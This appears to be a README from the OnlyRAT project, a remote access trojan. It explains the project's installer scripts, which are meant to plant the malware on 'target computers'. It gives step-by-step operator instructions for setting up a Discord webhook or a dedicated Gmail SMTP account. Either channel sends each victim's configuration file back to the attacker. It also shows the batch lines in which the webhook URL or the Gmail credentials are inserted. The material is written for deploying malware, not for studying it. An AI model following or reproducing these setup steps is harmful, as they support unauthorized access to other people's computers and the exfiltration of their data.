# Installers
This directory contains all the installers we can use to install the OnlyRAT malware on our target computers. 

## discord-webhook.cmd
The default installer for OnlyRAT. Uses a discord webhook to send the configuration file back to the attacker. 

**Instructions**
1. create a discord server by clicking the plus button in the bottom left

![Create Server](https://raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/assets/create-server.png)

2. go into the `integrations` section in the settings
3. click `Webhooks`
![Integrations](https://raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/assets/integrations.png)

4. click `New Webhook` and copy the URL
5. click `Copy Webhook URL` to copy the webhook URL
![Webhook](https://raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/assets/webhook.png)

6. in line 5, replace `DISCORDWEBHOOK` with the webhook URL 
```bat
echo DISCORDWEBHOOK > lawFvVTikZ.txt
```

## smtp-installer.cmd 
An installer that will send our configuration file through SMTP [Gmail]. A Gmail account is required for this installer. I suggest making a separate Gmail account for this malware. Your Gmail must have [LSA Access](https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4Px2VEFPoFPEuLutMD6UhNVRyY9P3s7l-pCGA53NBqilKVrtltrfS1823x5i6k6_pSEVp6jkEW0zKQT2CHN0WXh4fvGiw) enabled.

**Instructions**
- In lines 5 & 6, replace `example@gmail.com` and `password` with your appropiate gmail credentials
```bat
echo example@gmail.com > XbrMzmCUiE.txt
echo password > UJbMLjTIDr.txt
```
